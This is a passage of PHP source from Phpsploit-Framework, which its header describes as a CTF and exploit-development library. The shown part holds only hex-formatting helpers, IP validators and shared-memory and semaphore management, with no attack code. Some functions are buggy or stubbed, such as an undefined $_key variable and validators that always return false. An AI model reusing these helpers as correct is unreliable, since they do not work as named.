    public static function page_list_to_page_link_list ( $page_list , $action )
    {
        $_page_link_list = array ();
        foreach ( $page_list as $index => $item ) {
            $_page_link_list[] = array ( "link" => Class_Base_Response::get_url ( $action , $item ) , "item" => $item );
        }
        return $_page_link_list;
    }

    public static function memory_page_list_to_memory_page_link_list ( $page_list , $action )
    {
        $_page_link_list = array ();
        foreach ( $page_list as $index => $item ) {
            $_page_link_list[ $index ] = $item;
            foreach ( $item as $k => $v ) {
                $_page_link_list[ $index ][ $k ] = array (
                    "link"  => Class_Base_Response::get_url ( $action , array ( "key" => $k ) ) ,
                    "value" => $v ,
                );
            }
        }
        return $_page_link_list;
    }

    public static function get_bin_content_size ( $file_content , $data_type = self::TYPE_DATA_BIN )
    {
        $_file_content_size = 0;
        if ( ! is_string ( $file_content ) ) {
            throw new \Exception( "The data content is not a valid string" , 0 );
        }
        if ( ! is_integer ( $data_type ) ) {
            throw new \Exception( "The data type is not a valid integer number" , 0 );
        }
        if ( $data_type == self::TYPE_DATA_TEXT ) {
            $_file_content_size = strlen ( $file_content );
        } else if ( $data_type == self::TYPE_DATA_BIN ) {
            $_string_length = strlen ( $file_content );
            for ( $index = 0 ; $index < $_string_length ; $index += 4 ) {
                $_hex = substr ( $file_content , $index , 4 );
                if ( strlen ( $_hex ) == 4 ) {
                    if ( substr ( $file_content , 0 , 2 ) == "\x" ) {
                        if ( Class_Base_Format::is_minlen_to_maxlen_hex ( substr ( $file_content , 2 , 2 ) , 2 , 2 ) ) {
                            $_file_content_size ++;
                        }
                    }
                }
            }
        } else {
            throw new \Exception( "The data type is not within the acceptable range" , 0 );
        }
        return $_file_content_size;
    }

    public static function get_bin_content ( $file_content , $data_type = self::TYPE_DATA_BIN )
    {
        $_file_content = "";
        if ( ! is_string ( $file_content ) ) {
            throw new \Exception( "The data content is not a valid string" , 0 );
        }
        if ( ! is_integer ( $data_type ) ) {
            throw new \Exception( "The data type is not a valid integer number" , 0 );
        }
        if ( $data_type == self::TYPE_DATA_TEXT ) {
            $_file_content = $file_content;
        } else if ( $data_type == self::TYPE_DATA_BIN ) {
            $_string_length = strlen ( $file_content );
            for ( $index = 0 ; $index < $_string_length ; $index += 4 ) {
                $_hex = substr ( $file_content , $index , 4 );
                if ( strlen ( $_hex ) == 4 ) {
                    $_hex_0_2 = substr ( $_hex , 0 , 2 );
                    $_hex_2_4 = substr ( $_hex , 2 , 2 );
                    if ( $_hex_0_2 == '\x' ) {
                        if ( Class_Base_Format::is_minlen_to_maxlen_hex ( $_hex_2_4 , 2 , 2 ) ) {
                            $_char         = chr ( hexdec ( $_hex_2_4 ) );
                            $_file_content .= $_char;
                        }
                    }
                }
            }
        } else {
            throw new \Exception( "The data type is not within the acceptable range" , 0 );
        }
        return $_file_content;
    }

    public static function get_format_hex_content ( $bin_content )
    {
        if ( is_string ( $bin_content ) ) {
            $_bin_content_length = strlen ( $bin_content );
            $_return_content     = "";
            for ( $index = 0 ; $index < $_bin_content_length ; $index ++ ) {
                $_return_content .= ( '\x' . ( str_pad ( dechex ( ord ( substr ( $bin_content , $index , 1 ) ) ) , 2 , '0' , STR_PAD_LEFT ) ) );
            }
            return $_return_content;
        }
        return false;
    }

    public static function get_format_hex_content_size ( $format_hex_content )
    {
        if ( ! is_string ( $format_hex_content ) ) {
            throw new \Exception( "The binary content is not a valid string" , 0 );
        }
        if ( strlen ( $format_hex_content ) > 1024 * 1024 * 10 ) {
            throw new \Exception( "The data volume is too large to calculate the data size in real-time" , 0 );
        }
        $_format_hex_content_size = self::get_bin_content_size ( $format_hex_content , self::TYPE_DATA_BIN );
        return $_format_hex_content_size;
    }

    public static function filter_file_name_special_symbols ( $file_name )
    {
        $_file_name        = "";
        $_file_name_length = strlen ( $file_name );
        for ( $index = 0 ; $index < $_file_name_length ; $index ++ ) {
            $_file_name_index_char = substr ( $file_name , $index , 1 );
            if ( in_array ( $_file_name_index_char , self::$_file_name_conventional_matchings ) ) {
                $_file_name .= $_file_name_index_char;
            }
        }
        return $_file_name;
    }

    public static function is_user_name ( $user )
    {
        return false;
    }

    public static function is_user_password ( $password )
    {
        return false;
    }

    public static function is_domain_name ( $domain )
    {
        return false;
    }

    public static function is_database_name ( $database )
    {
        return false;
    }

    public static function is_table_name ( $table )
    {
        return false;
    }

    public static function is_ipv4_address ( $ipv4 )
    {
        $_bool = filter_var ( $ipv4 , FILTER_VALIDATE_IP , FILTER_FLAG_IPV4 );
        return $_bool;
    }

    public static function is_ipv6_address ( $ipv6 )
    {
        $_bool = filter_var ( $ipv6 , FILTER_VALIDATE_IP , FILTER_FLAG_IPV6 );
        return $_bool;
    }

    public static function is_ip_address ( $ip )
    {
        $_bool = filter_var ( $ip , FILTER_VALIDATE_IP , ( FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6 ) );
        return $_bool;
    }

    public static function show_format_hex_number ( $hex )
    {
        $_hex = ( ( '0x' ) . str_pad ( $hex , 16 , self::CHAR_ZERO , STR_PAD_LEFT ) );
        return $_hex;
    }

    public static function array_to_string ( $array )
    {
        $_return = "";
        if ( is_array ( $array ) || ( is_object ( $array ) ) ) {
            foreach ( $array as $key => $value ) {
                $_return .= ( print_r ( $value , true ) . ( chr ( 10 ) ) );
            }
        }
        return $_return;
    }

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-1-27
 * Time: 上午11:03
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Memory extends Class_Base implements Interface_Base_Memory
{
    private static $_lock_keys = array (
        'default' => 0000000000 ,
    );

    public static function get_lock_keys ()
    {
        return self::$_lock_keys;
    }

    public static function get_lock_key ( $key )
    {
        if ( empty( self::$_lock_keys[ $key ] ) ) {
            return null;
        }
        return self::$_lock_keys[ $key ];
    }

    public static function exist_lock_key ( $key , $value )
    {
        if ( ( array_key_exists ( $key , self::$_lock_keys ) ) && ( in_array ( $value , self::$_lock_keys ) ) && ( self::$_lock_keys[ $key ] == $value ) ) {
            return 1;
        }
        return 0;
    }

    public static function add_lock_key ( $key , $value )
    {
        if ( ( array_key_exists ( $key , self::$_lock_keys ) ) || ( in_array ( $value , self::$_lock_keys ) ) ) {
            return 0;
        }
        self::$_lock_keys[ $key ] = $value;
        return 1;
    }

    //
    public static function path ( $path )
    {
        $_path = str_replace ( "\\" , "/" , $path );
        return $_path;
    }

    public static function check_pack_integer ( $integer )
    {
        if ( ! Class_Base_Format::is_minlen_to_maxlen_integer ( $integer , Class_Base_Format::INTEGER_MIN_LENGTH , Class_Base_Format::INTEGER_MAX_LENGTH ) ) {
            throw new \Exception( "pack integer data is error , data : " . print_r ( $integer , true ) , 0 );
        }
    }

    public static function pack ( $data , $format_type = self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK )
    {
        $_format = self::DATA_FORMAT_STRING_NULL_FILL_PACK;
        if ( $format_type == self::DATA_FORMAT_TYPE_64_INTEGER_PACK ) {
            self::check_pack_integer ( $data );
            $_format = self::DATA_FORMAT_64_INTEGER_PACK;
            $data    = dechex ( $data );
        }
        $_pack_data = pack ( $_format , $data );
        return $_pack_data;
    }

    public static function unpack ( $pack_data , $format_type = self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK )
    {
        $_format = self::DATA_FORMAT_STRING_NULL_FILL_PACK;
        if ( $format_type == self::DATA_FORMAT_TYPE_64_INTEGER_PACK ) {
            $_format = self::DATA_FORMAT_64_INTEGER_PACK;
        }
        $_data = unpack ( $_format , $pack_data );
        if ( is_array ( $_data ) ) {
            $_data = $_data[ 1 ];
        }
        if ( $format_type == self::DATA_FORMAT_TYPE_64_INTEGER_PACK ) {
            $_data = hexdec ( $_data );
            if ( ! Class_Base_Format::is_minlen_to_maxlen_integer ( $_data , Class_Base_Format::INTEGER_MIN_LENGTH , Class_Base_Format::INTEGER_MAX_LENGTH ) ) {
                throw new \Exception( "unpack integer data is error , data : " . print_r ( $_data , true ) , 0 );
            }
        }
        return $_data;
    }

    //

    public static function read_share_memory_integer ( $key )
    {
        $_block_id = Class_Base_Memory::open_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , self::BLOCK_SIZE_16 );
        $_integer  = Class_Base_Memory::read_share_memory ( $_block_id , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , self::BLOCK_SIZE_16 , self::DATA_FORMAT_TYPE_64_INTEGER_PACK );
        return $_integer;
    }

    public static function write_share_memory_integer ( $key , $value )
    {
        $_block_id = Class_Base_Memory::open_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , self::BLOCK_SIZE_16 );
        $_length   = Class_Base_Memory::write_share_memory ( $_block_id , $value , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , self::DATA_FORMAT_TYPE_64_INTEGER_PACK );
        return $_length;
    }

    //
    public static function create_share_memory_key ()
    {
        $_key = time () . rand ( 10000000 , 99999999 );
        return $_key;
    }

    public static function create_share_memory ( &$key = null , $mode = self::MODE_SHARE_MEMORY_READ_AND_WRITE , $size = self::BLOCK_SIZE_65536 , $is_check_key_format = true )
    {
        if ( ( ! empty( $is_check_key_format ) ) ) {
            if ( empty( $key ) || ( ! Class_Base_Format::is_minlen_to_maxlen_integer ( $key , Class_Base_Format::INTEGER_MAX_LENGTH , Class_Base_Format::INTEGER_MAX_LENGTH ) ) ) {
                $key = self::create_share_memory_key ();
            }
        } else {
            if ( empty( $key ) ) {
                $key = self::create_share_memory_key ();
            }
        }
        $_shmid = shmop_open ( $key , self::FLAGS_SHARE_MEMORY_CREATE , $mode , $size );
        if ( ( ! empty( $_shmid ) ) ) {
            self::_add_keys_item ( Class_Base_Block_Keys::get_block_key () , $key , $size );
        }
        return $_shmid;
    }

    public static function open_share_memory ( &$key = null , $mode = self::MODE_SHARE_MEMORY_READ_AND_WRITE , $size = self::BLOCK_SIZE_65536 , $flags = self::FLAGS_SHARE_MEMORY_OPEN , $is_check_key_format = true )
    {
        if ( ( ! empty( $is_check_key_format ) ) ) {
            if ( empty( $key ) || ( ! Class_Base_Format::is_minlen_to_maxlen_integer ( $key , Class_Base_Format::INTEGER_MAX_LENGTH , Class_Base_Format::INTEGER_MAX_LENGTH ) ) ) {
                $key = self::create_share_memory_key ();
            }
        } else {
            if ( empty( $key ) ) {
                $key = self::create_share_memory_key ();
            }
        }
        $_shmid = shmop_open ( $key , $flags , $mode , $size );
        if ( ( ! empty( $_shmid ) ) ) {
            $_check = Class_Base_Block_Keys::start_check_status ( $key );
            if ( ! empty( $_check ) ) {
                self::_add_keys_item ( Class_Base_Block_Keys::get_block_key () , $key , $size );
            }
        }
        return $_shmid;
    }

    public static function size_share_memory ( $shmid )
    {
        $_size = shmop_size ( $shmid );
        return $_size;
    }

    public static function read_share_memory ( $shmid , $offset = self::SHARE_MEMORY_OFFSET_START , $length = self::BLOCK_SIZE_65536 , $format_type = self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK )
    {
        $_pack_data = shmop_read ( $shmid , $offset , $length );
        $_data      = self::unpack ( $_pack_data , $format_type );
        if ( $format_type == self::DATA_FORMAT_TYPE_64_INTEGER_PACK ) {
            $_data = intval ( $_data );
        }
        return $_data;
    }

    public static function write_share_memory ( $shmid , $data , $offset = self::SHARE_MEMORY_OFFSET_START , $format_type = self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK )
    {
        $_pack_data = self::pack ( $data , $format_type );
        $_length    = shmop_write ( $shmid , $_pack_data , $offset );
        if ( ! empty( $_length ) ) {
            $_length = shmop_size ( $shmid );
        }
        return $_length;
    }

    public static function reset_string_share_memory ( $shmid , $size )
    {
        $_success = 1;
        for ( $index = 0 ; $index < $size ; $index++ ) {
            $_length = self::write_share_memory ( $shmid , self::BLCOK_DATA_VALUE_ASCII_CODE_ZERO , $index , self::DATA_FORMAT_STRING_NULL_FILL_PACK );
            if ( empty( $_length ) ) {
                $_success = 0;
            }
        }
        return $_success;
    }

    public static function reset_integer_share_memory ( $shmid )
    {
        $_success = 1;
        $_length  = self::write_share_memory ( $shmid , self::BLOCK_DATA_VALUE_INTEGER_ZERO , self::SHARE_MEMORY_OFFSET_START , self::DATA_FORMAT_64_INTEGER_PACK );
        if ( empty( $_length ) ) {
            $_success = 0;
        }
        return $_success;
    }

    public static function clear_share_memory ( $shmid )
    {
        $_bool = shmop_delete ( $shmid );
        if ( ! empty( $_bool ) ) {
            @shmop_close ( $shmid );
        }
        return $_bool;
    }

    //
    public static function size_share_memory_by_key ( $key , $size )
    {
        $_shmid = self::open_share_memory ( $key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , $size );
        $_size  = shmop_size ( $_shmid );
        return $_size;
    }

    public static function read_share_memory_by_key ( $key , $size , $offset = self::SHARE_MEMORY_OFFSET_START , $length = self::BLOCK_SIZE_65536 , $format_type = self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK )
    {
        $_shmid     = self::open_share_memory ( $key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , $size );
        $_pack_data = shmop_read ( $_shmid , $offset , $length );
        $_data      = self::unpack ( $_pack_data , $format_type );
        if ( $format_type == self::DATA_FORMAT_TYPE_64_INTEGER_PACK ) {
            $_data = intval ( $_data );
        }
        return $_data;
    }

    public static function write_share_memory_by_key ( $key , $size , $data , $offset = self::SHARE_MEMORY_OFFSET_START , $format_type = self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK )
    {
        $_shmid     = self::open_share_memory ( $key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , $size );
        $_pack_data = self::pack ( $data , $format_type );
        $_length    = shmop_write ( $_shmid , $_pack_data , $offset );
        if ( ! empty( $_length ) ) {
            $_length = shmop_size ( $_shmid );
        }
        return $_length;
    }

    public static function reset_string_share_memory_by_key ( $key , $size )
    {
        $_shmid   = self::open_share_memory ( $key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , $size );
        $_success = 1;
        for ( $index = 0 ; $index < $size ; $index++ ) {
            $_length = self::write_share_memory ( $_shmid , self::BLCOK_DATA_VALUE_ASCII_CODE_ZERO , $index , self::DATA_FORMAT_STRING_NULL_FILL_PACK );
            if ( empty( $_length ) ) {
                $_success = 0;
            }
        }
        return $_success;
    }

    public static function reset_integer_share_memory_by_key ( $key , $size )
    {
        $_shmid   = self::open_share_memory ( $key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , $size );
        $_success = 1;
        $_length  = self::write_share_memory ( $_shmid , self::BLOCK_DATA_VALUE_INTEGER_ZERO , self::SHARE_MEMORY_OFFSET_START , self::DATA_FORMAT_64_INTEGER_PACK );
        if ( empty( $_length ) ) {
            $_success = 0;
        }
        return $_success;
    }

    public static function delete_share_memory_by_key ( $key , $size )
    {
        $key  = intval ( $key );
        $size = intval ( $size );
        if ( $key == Interface_Base_Block_Keys::KEY ) {
            return false;
        }
        $_keys_key = Interface_Base_Block_Keys::KEY;
        $_shmid    = self::open_share_memory ( $_keys_key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , Interface_Base_Block_Keys::SIZE_BLOCK , self::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
        if ( empty( $_shmid ) ) {
            return false;
        }
        for ( $index = Class_Base_BlockHead::SIZE_BLOCK_HEAD ; $index < ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + Interface_Base_Block_Keys::MAP_SIZE ) ; $index += Interface_Base_Block_Keys::MAP_ITEM_SIZE ) {
            $_item = Class_Base_Memory::read_share_memory ( $_shmid , $index , Interface_Base_Block_Keys::MAP_ITEM_SIZE , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
            if ( ! Class_Base_Format::is_empty ( $_item ) ) {
                $_item_hex_key  = substr ( $_item , 0 , Interface_Base_Block_Keys::SIZE_BLOCK_KEY );
                $_item_hex_size = substr ( $_item , Interface_Base_Block_Keys::SIZE_BLOCK_KEY , Interface_Base_Block_Keys::SIZE_BLOCK_SIZE );
                $_item_dec_key  = Class_Base_Format::hex_to_dec ( $_item_hex_key );
                $_item_dec_size = Class_Base_Format::hex_to_dec ( $_item_hex_size );
                if ( ( ! empty( $_item_dec_key ) ) && ( ! empty( $_item_dec_size ) ) ) {
                    if ( ( $key == $_item_dec_key ) && ( $size == $_item_dec_size ) ) {
                        $_item_shmid = self::open_share_memory ( $_item_dec_key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , $_item_dec_size , self::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
                        if ( ! empty( $_item_shmid ) ) {
                            $_item_deleted = self::clear_share_memory ( $_item_shmid );
                            if ( empty( $_item_deleted ) ) {
                                return false;
                            }
                        }
                        $_write_length = self::write_share_memory ( $_shmid , Class_Base_Format::string_to_data ( null , Interface_Base_Block_Keys::MAP_ITEM_SIZE ) , $index , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                        if ( empty( $_write_length ) ) {
                            return false;
                        }
                        return true;
                    }
                }
            }
        }
        return false;
    }

    public static function clear_share_memory_by_key ( $key , $size )
    {
        $_shmid = self::_open_share_memory ( $key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , $size , self::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
        if ( $key == Class_Base_Block_Keys::get_block_key () ) {
            $_count = Class_Base_Block_Keys::get_map_count ( $key );
            if ( empty( $_count ) ) {
                $_bool = self::clear_share_memory ( $_shmid );
                return $_bool;
            } else if ( ( $_count == 1 ) ) {
                $_item_key = self::read_share_memory ( $_shmid , Class_Base_BlockHead::SIZE_BLOCK_HEAD , Class_Base_Block_Keys::SIZE_BLOCK_KEY );
                if ( Class_Base_Format::is_empty ( $_item_key ) ) {
                    $_bool = self::clear_share_memory ( $_shmid );
                    return $_bool;
                } else {
                    $_item_key = Class_Base_Format::hex_to_dec ( $_item_key );
                    if ( $_item_key == Interface_Base_BlockKey::KEYS ) {
                        $_bool = self::clear_share_memory ( $_shmid );
                        return $_bool;
                    }
                }
            }
        } else {
            $_length = self::_clear_keys_item ( Class_Base_Block_Keys::get_block_key () , $key );
            if ( ! empty( $_length ) ) {
                Class_Base_Block_Keys::clear_check_status ( $key );
                $_bool = self::clear_share_memory ( $_shmid );
                return $_bool;
            }
        }
        return false;
    }
    //

    //
    public static function create_lock_key ( $key )
    {
        $_key = self::LOCK_KEY . $key;
        return $_key;
    }

    public static function get_lock_id ( $key = null )
    {
        if ( empty( $key ) || ( ! is_numeric ( $key ) ) ) {
            return null;
        }
        $_sem_id = sem_get ( $key );
        return $_sem_id;
    }

    public static function lock ( $key = null )
    {
        $_sem_id = self::get_lock_id ( $key );
        if ( empty( $_sem_id ) ) {
            throw new \Exception( "share memory lock id is error" , 0 );
        }
        $_success = sem_acquire ( $_sem_id );
        if ( empty( $_success ) ) {
            throw new \Exception( "get share memory lock is error" , 0 );
        }
        return $_sem_id;
    }

    public static function unlock ( $key )
    {
        $_sem_id = sem_get ( $key );
        if ( $_sem_id === false ) {
            throw new \Exception( "sem id : false" , 0 );
        }
        $_success = sem_release ( $_sem_id );
        if ( $_success === false ) {
            //throw new \Exception("sem release : false", 0);
        }
        if ( $_success ) {
            $_success = sem_remove ( $_sem_id );
            if ( $_success === false ) {
                throw new \Exception( "sem remove : false" , 0 );
            }
        }
        return $_sem_id;
    }

    private static function _open_share_memory ( &$key = null , $mode = self::MODE_SHARE_MEMORY_READ_AND_WRITE , $size = self::BLOCK_SIZE_65536 , $flags = self::FLAGS_SHARE_MEMORY_OPEN )
    {
        if ( empty( $key ) || ( ! is_integer ( $key ) ) ) {
            $key = self::create_share_memory_key ();
        }
        $_shmid = shmop_open ( $key , $flags , $mode , $size );
        return $_shmid;
    }

    //
    private static function _exist_keys_item_key ( $key , $item_key )
    {
        $_block_id = self::_open_share_memory ( $key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Block_Keys::SIZE_BLOCK , self::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
        if ( ! Class_Base_Format::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < Class_Base_Block_Keys::MAP_SIZE ; $index += Class_Base_Block_Keys::MAP_ITEM_SIZE ) {
                $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , Class_Base_Block_Keys::MAP_ITEM_SIZE , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                if ( ! Class_Base_Format::is_empty ( $_item ) ) {
                    $_item_key = hexdec ( substr ( $_item , 0 , Class_Base_Block_Keys::SIZE_BLOCK_KEY ) );
                    if ( $_item_key == $item_key ) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private static function _add_keys_item ( $key , $item_key , $item_size )
    {
        $_exist = self::_exist_keys_item_key ( $key , $item_key );
        if ( ! $_exist ) {
            $_block_id = self::_open_share_memory ( $key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Block_Keys::SIZE_BLOCK );
            if ( ! Class_Base_Format::is_empty ( $_block_id ) ) {
                $_block_head = self::read_share_memory ( $_block_id , self::SHARE_MEMORY_OFFSET_START , Class_Base_BlockHead::SIZE_BLOCK_HEAD , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                if ( Class_Base_Format::is_empty ( $_block_head ) ) {
                    $_block_head_object = Class_Base_BlockHead::create_block_head ( Interface_Base_BlockName::NAME_BLOCK_KEYS , $key , Interface_Base_Block_Keys::MAP_SIZE , Interface_Base_BlockStatus::STATUS_BLOCK_ENABLED , Interface_Base_BlockMode::MODE_BLOCK_READ_AND_WRITE , Interface_Base_BlockType::TYPE_BLOCK_KEYS , Interface_Base_BlockContentType::TYPE_CONTENT_STRING , null , Class_Base_BlockHead::FLAG_BLOCK_HEAD_END );
                    $_block_head        = $_block_head_object->get_block_string ();
                    $_write_length      = self::write_share_memory ( $_block_id , $_block_head , self::SHARE_MEMORY_OFFSET_START , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                    if ( empty( $_write_length ) ) {
                        throw new \Exception( "keys block init is fail" , 0 );
                    }
                }
                $_block_end_flag = self::read_share_memory ( $_block_id , ( self::SHARE_MEMORY_OFFSET_START + Class_Base_BlockHead::SIZE_BLOCK_HEAD + Interface_Base_Block_Keys::MAP_SIZE ) , Class_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                if ( Class_Base_Format::is_empty ( $_block_end_flag ) ) {
                    $_block_end_flag_object = Class_Base_BlockEndFlag::create_block_end_flag ( Interface_Base_BlockEndFlag::FLAG_BLOCK_END );
                    $_block_end_flag        = $_block_end_flag_object->get_block_string ();
                    $_write_length          = self::write_share_memory ( $_block_id , $_block_end_flag , self::SHARE_MEMORY_OFFSET_START , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                    if ( empty( $_write_length ) ) {
                        throw new \Exception( "keys block init is fail" , 0 );
                    }
                }
                for ( $index = 0 ; $index < Class_Base_Block_Keys::MAP_SIZE ; $index += Class_Base_Block_Keys::MAP_ITEM_SIZE ) {
                    $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , Class_Base_Block_Keys::MAP_ITEM_SIZE , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                    if ( Class_Base_Format::is_empty ( $_item ) ) {
                        $_item_key  = Class_Base_Format::dec_to_hex ( $item_key );
                        $_item_size = Class_Base_Format::dec_to_hex ( $item_size );
                        $_item      = ( $_item_key . $_item_size );
                        $_length    = Class_Base_Memory::write_share_memory ( $_block_id , $_item , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                        if ( empty( $_length ) ) {
                            throw new \Exception( "write block key to block keys is error" , 0 );
                        }
                        return $_length;
                    }
                }
            }
        }
        return false;
    }

    private static function _write_keys_item ( $key , $item_key , $item_size )
    {
        $_exist = self::_exist_keys_item_key ( $key , $item_key );
        if ( ! $_exist ) {
            $_block_id = self::_open_share_memory ( $key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Block_Keys::SIZE_BLOCK , self::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
            if ( ! Class_Base_Format::is_empty ( $_block_id ) ) {
                for ( $index = 0 ; $index < Class_Base_Block_Keys::MAP_SIZE ; $index += Class_Base_Block_Keys::MAP_ITEM_SIZE ) {
                    $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , Class_Base_Block_Keys::MAP_ITEM_SIZE , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                    if ( Class_Base_Format::is_empty ( $_item ) ) {
                        $_item_key  = Class_Base_Format::dec_to_hex ( $item_key );
                        $_item_size = Class_Base_Format::dec_to_hex ( $item_size );
                        $_item      = ( $_item_key . $_item_size );
                        $_length    = Class_Base_Memory::write_share_memory ( $_block_id , $_item , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                        return $_length;
                    }
                }
            }
        } else {
            $_block_id = self::_open_share_memory ( $key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Block_Keys::SIZE_BLOCK , self::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
            if ( ! Class_Base_Format::is_empty ( $_block_id ) ) {
                for ( $index = 0 ; $index < Class_Base_Block_Keys::MAP_SIZE ; $index += Class_Base_Block_Keys::MAP_ITEM_SIZE ) {
                    $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , Class_Base_Block_Keys::MAP_ITEM_SIZE , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                    if ( ! Class_Base_Format::is_empty ( $_item ) ) {
                        $_item_key = Class_Base_Format::hex_to_dec ( substr ( $_item , 0 , Class_Base_Block_Keys::SIZE_BLOCK_KEY ) );
                        if ( $item_key == $_item_key ) {
                            $_item_size = Class_Base_Format::dec_to_hex ( $item_size );
                            $_length    = Class_Base_Memory::write_share_memory ( $_block_id , $_item_size , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index + Class_Base_Block_Keys::SIZE_BLOCK_KEY ) , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                            return $_length;
                        }
                    }
                }
            }
        }
        return false;
    }

    private static function _clear_keys_item ( $key , $item_key )
    {
        $_exist = self::_exist_keys_item_key ( $key , $item_key );
        if ( $_exist ) {
            $_block_id = self::_open_share_memory ( $key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Block_Keys::SIZE_BLOCK , self::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
            if ( ! Class_Base_Format::is_empty ( $_block_id ) ) {
                for ( $index = 0 ; $index < Class_Base_Block_Keys::MAP_SIZE ; $index += Class_Base_Block_Keys::MAP_ITEM_SIZE ) {
                    $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , Class_Base_Block_Keys::MAP_ITEM_SIZE , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                    if ( ! Class_Base_Format::is_empty ( $_item ) ) {
                        $_item_key = Class_Base_Format::hex_to_dec ( substr ( $_item , 0 , Class_Base_Block_Keys::SIZE_BLOCK_KEY ) );
                        if ( $item_key == $_item_key ) {
                            $_item   = Class_Base_Format::string_to_content ( null , Class_Base_Block_Keys::MAP_ITEM_SIZE );
                            $_length = Class_Base_Memory::write_share_memory ( $_block_id , $_item , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                            return $_length;
                        }
                    }
                }
            }
        }
        return true;
    }

    public static function clear ( $key = Interface_Base_Block_Keys::KEY )
    {
        $_key   = intval ( $key );
        $_size  = Interface_Base_Block_Keys::SIZE_BLOCK;
        $_shmid = self::open_share_memory ( $_key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , $_size , self::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
        if ( ! empty( $_shmid ) ) {
            $_block_type = self::read_share_memory ( $_shmid , Class_Base_BlockHead::get_head_block_type_offset () , Class_Base_BlockHead::get_head_block_type_size () );
            if ( $_block_type == Interface_Base_BlockType::TYPE_BLOCK_KEYS ) {
                for ( $index = 0 ; $index < Interface_Base_Block_Keys::MAP_SIZE ; $index += Interface_Base_Block_Keys::MAP_ITEM_SIZE ) {
                    $_item = Class_Base_Memory::read_share_memory ( $_shmid , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , Interface_Base_Block_Keys::MAP_ITEM_SIZE , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                    if ( ! Class_Base_Format::is_empty ( $_item ) ) {
                        try {
                            $_item_key  = Class_Base_Format::hex_to_dec ( substr ( $_item , 0 , Interface_Base_Block_Keys::SIZE_BLOCK_KEY ) );
